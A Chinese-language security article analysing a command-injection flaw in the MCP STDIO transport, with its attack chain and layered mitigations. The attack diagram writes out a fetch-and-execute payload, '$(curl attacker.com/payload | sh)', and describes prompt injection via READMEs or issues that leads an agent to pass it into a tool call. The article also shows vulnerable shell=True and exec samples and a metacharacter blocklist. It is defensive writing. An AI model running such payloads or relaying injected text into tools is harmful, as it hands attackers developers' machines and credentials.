2026年4月中旬，安全研究人员披露了 Model Context Protocol STDIO 传输层的一类漏洞，允许在宿主机上执行任意命令。漏洞并非存在于 MCP 规范本身，而是源于官方 SDK（TypeScript 和 Python）在通过标准输入/输出管道生成和与工具服务器进程通信时的实现方式。用户可控的输入在未充分净化的情况下到达 shell 命令行，被 shell 解释执行。

这不是一种新颖的攻击模式。通过未净化的子进程调用实现命令注入，属于 OWASP 排名前三的注入类别，自1990年代起就是已知漏洞类型。**真正值得关注的是攻击面**：MCP 服务器是 Claude Code、Cursor、Windsurf 以及越来越多的 IDE 集成的核心工具接口。一旦某个 MCP 服务器存在漏洞，每位开发者的本地环境都会成为目标，攻击载体就是聊天消息的内容。

## STDIO 传输架构

MCP 支持两种传输机制实现 Agent 与工具之间的通信。HTTP 传输（SEP-1442 中标准化）使用标准 HTTP 上的无状态请求-响应模式——与 Web 相同的传输层，拥有数十年加固实现。STDIO 传输则使用 Unix 管道：Agent 将工具服务器作为子进程启动，将 JSON-RPC 消息写入进程的 stdin，并从 stdout 读取响应。

STDIO 传输存在的理由是简单。配置 STDIO 传输的 MCP 工具服务器无需网络配置、无需端口分配、无需 TLS 证书。只需在 MCP 客户端配置中添加 `command` 和 `args` 字段，客户端就会启动进程，建立可用的工具连接。这种简洁性使 STDIO 成为本地开发的首选默认传输方式，也是大多数 MCP 服务器首发支持的传输方式。

问题出在进程生成环节。当 MCP 客户端启动工具服务器时，它从配置字段构造 shell 命令，在某些实现中还包括包含用户可控值的参数。如果这些值包含 shell 元字符——分号、反引号、`$()` 替换、管道操作符——shell 就会解释执行它们。

```python
import subprocess


def spawn_mcp_server_vulnerable(command: str, args: list[str]) -> subprocess.Popen:
    """存在漏洞的 MCP 客户端启动工具服务器方式。

    如果 `args` 包含用户可控值，则可被利用。
    Shell 会解释参数中的元字符。
    """
    full_command = f"{command} {' '.join(args)}"
    return subprocess.Popen(
        full_command,
        shell=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )


def spawn_mcp_server_safe(command: str, args: list[str]) -> subprocess.Popen:
    """安全启动：完全绕过 shell。

    subprocess.Popen 使用 shell=False 时，参数直接传递给 execvp，
    不会解释 shell 元字符。
    """
    return subprocess.Popen(
        [command, *args],
        shell=False,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
```

隔离来看，修复方法很简单：永远不要通过 shell 传递用户可控值。Python 中使用 `shell=False`，Node.js 中使用 `execFile` 而非 `exec`，将参数作为数组传递而非拼接字符串。但漏洞在多个 SDK 版本中持续存在，原因是 STDIO 传输设计用于可信的本地使用场景，而随着 MCP 工具成为交互式 Agent 工作流的一部分，"可信配置"与"用户可控输入"之间的边界发生了移动。

## 攻击链路

攻击需要三个条件同时满足：

1. 受害者的机器上配置了使用 STDIO 传输的 MCP 工具服务器。
2. 工具服务器的启动命令或运行时参数包含来自用户输入的值——聊天消息、文件内容或仓库元数据。
3. 生成进程时，代码未净化就通过 shell 传递这些值。

在典型的 Claude Code 或 Cursor 配置中，条件1对任何本地安装的 MCP 服务器默认满足。条件2在 Agent 将用户查询传递给接受自由文本参数的工具时满足——搜索工具、文件操作工具、数据库查询工具。条件3取决于 SDK 版本和工具服务器的具体实现。

攻击路径：

```
用户消息："搜索匹配 $(curl attacker.com/payload | sh) 的文件"
        │
        ▼
Agent 调用 MCP 工具：file_search(query="$(curl attacker.com/payload | sh)")
        │
        ▼
MCP 客户端启动工具服务器或将查询作为参数传递
        │
        ▼
Shell 解释 $() 为命令替换
        │
        ▼
curl 下载并 sh 执行攻击者的载荷
        │
        ▼
以开发者权限执行任意代码
```

载荷以启动 IDE 或 CLI Agent 的用户的完整权限运行。在典型的开发者机器上，这意味着对所有源代码、SSH 密钥、云凭证、浏览器会话 cookie 以及存储在环境变量或 dotfiles 中的任何密钥的读写权限。

攻击并不要求用户故意构造恶意输入。嵌入在 Agent 读取的文件中的提示词注入——克隆仓库中的恶意 README、GitHub 上精心制作的问题描述、被污染的代码注释——可以触发相同的链路。Agent 读取注入的内容，将其传递给工具调用，工具调用到达 shell。

## 漏洞暴露了什么

直接影响是任意代码执行。但结构性暴露面更广，值得详细列举，因为它决定了缓解策略的方向。

**开发者凭证窃取。** 大多数开发者机器都有 SSH 密钥（`~/.ssh/`）、云提供商凭证（`~/.aws/`、`~/.config/gcloud/`）、包注册表令牌（`~/.npmrc`、`~/.pypirc`）以及环境变量中的 API 密钥。**单个 RCE 载荷可以在不到一秒内外泄所有这些凭证。**

**供应链投毒。** 拥有源代码和构建产物的写权限后，攻击者可以将后门注入到开发者正在工作的项目中。如果开发者推送且 CI/CD 流水线运行，后门就会传播到生产环境。这与破坏 SolarWinds 和 xz-utils 包的供应链攻击向量相同，但触发方式是通过 Agent 交互而非被入侵的维护者账户。

**横向移动。** 开发者机器通常持有 VPN 访问权限、数据库凭证，以及对预发布环境和生产环境的管理权限。开发者笔记本上的 RCE 通常距离生产环境 breach 只有一跳之遥。

**持久化。** 载荷可以安装反向 shell、添加 SSH 授权密钥，或修改 shell 配置文件以在每次终端启动时执行。初始的 MCP 漏洞是入口点；持久化机制独立于 MCP。

## 为什么这种事一再发生

STDIO 漏洞是 Agent 安全中结构性问题的具体体现：**模型与工具执行环境之间的信任边界定义不清。**

在传统应用中，用户输入经过明确定义的路径：HTTP 请求 → 输入验证 → 业务逻辑 → 数据库查询。每次转换都有净化检查点。SQL 注入发生在业务逻辑与数据库之间的检查点缺失时。XSS 发生在服务器与浏览器之间的检查点缺失时。

在 Agent 系统中，流程是：用户消息 → 模型推理 → 工具调用 → 工具执行。模型是一个推理层，将用户意图转化为结构化的工具调用。但模型不做净化——它做翻译。如果用户消息包含 shell 元字符，模型忠实地将它们传递给工具参数，模型做的就是它被设计的事。**净化责任落在工具执行层，而 STDIO 传输在设计时并未考虑到这一责任。**

```python
from dataclasses import dataclass


@dataclass(frozen=True)
class McpToolCall:
    """表示从 Agent 到 MCP 服务器的工具调用。"""
    tool_name: str
    arguments: dict[str, object]


def sanitize_tool_arguments(call: McpToolCall) -> McpToolCall:
    """在传递给工具执行前净化所有字符串参数。

    纵深防御：即使传输层处理了转义，
    编排层也应该剥离已知危险模式。
    """
    sanitized_args = {}
    for key, value in call.arguments.items():
        if isinstance(value, str):
            sanitized_args[key] = _strip_shell_metacharacters(value)
        else:
            sanitized_args[key] = value

    return McpToolCall(
        tool_name=call.tool_name,
        arguments=sanitized_args,
    )


_DANGEROUS_PATTERNS = [
    "$(", "`", ";", "&&", "||", "|", "\n",
    ">", "<", ">>", "<<",
]


def _strip_shell_metacharacters(value: str) -> str:
    """从字符串值中移除 shell 元字符。

    这是黑名单方法——本质上不完整。
    优先在传输层使用 shell=False。
    """
    result = value
    for pattern in _DANGEROUS_PATTERNS:
        result = result.replace(pattern, "")
    return result
```

上面展示的黑名单方法是纵深防御，而非主要缓解措施。黑名单本质上不完整——Unicode 同形异义词、编码技巧和 shell 特定的转义可以绕过字符级过滤器。**主要修复必须在传输层：永远不要为工具服务器通信调用 shell。**

## 缓解措施

三层防御，按优先级排序：

**第一层：消除 shell 调用。** 更新 MCP SDK 依赖到使用 `shell=False`（Python）或 `execFile`（Node.js）进行 STDIO 传输的版本。如果维护自定义 MCP 服务器，审计所有 `subprocess.Popen`、`os.system`、`child_process.exec` 及等效调用。将 `shell=True` 替换为直接 exec。

```typescript
// 存在漏洞：shell 解释元字符
const proc = child_process.exec(`node ${serverPath} ${userArg}`);

// 安全：参数直接传递，无 shell 解释
const proc = child_process.execFile("node", [serverPath, userArg]);
```

**第二层：迁移到 HTTP 传输。** 2026年4月的 SEP-1442 更新使无状态 HTTP 成为推荐的 MCP 传输方式。HTTP 传输不启动本地进程，不涉及 shell 调用。迁移成本是将工具服务器部署为 HTTP 服务（本地即可），而不是子进程。

**第三层：沙箱化 Agent 的工具执行。** 在受限文件系统访问、无网络出口、不访问宿主机凭证的容器或虚拟机中运行 MCP 工具服务器。使用 Docker 的 `--network=none` 和项目目录的只读绑定挂载，即使 RCE 成功也能消除大部分后续利用价值。

```yaml
# 用于沙箱化 MCP 工具服务器的 docker-compose.yml
services:
  mcp-file-search:
    image: mcp-tools/file-search:latest
    network_mode: none
    read_only: true
    volumes:
      - ./src:/workspace:ro
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
```

## 更广泛的教训

LLM 与执行环境之间的每个接口都是潜在的注入边界。MCP STDIO 漏洞与 SQL 注入、命令注入和 LDAP 注入属于同一类漏洞——用户输入在未净化的情况下到达解释器。唯一不同的是解释器：Unix shell 而非 SQL 引擎。

Agent 框架积累这些边界接口的速度超过了它们被保护的速度。MCP 工具调用、代码执行沙箱、浏览器自动化、文件系统访问、git 操作——每一个都是模型生成内容到达对其进行解释的系统的通道。Web 应用在二十多年中发展的安全规范——每个信任边界的输入验证、参数化查询、沙箱化执行——需要以同样的严谨程度应用到 Agent 系统。

MCP STDIO 漏洞会被修复。它所代表的那一类漏洞——通过 Agent 工具接口的注入——只要 Agent 系统继续将工具执行视为可信的本地操作而非对抗性边界，就会持续存在。
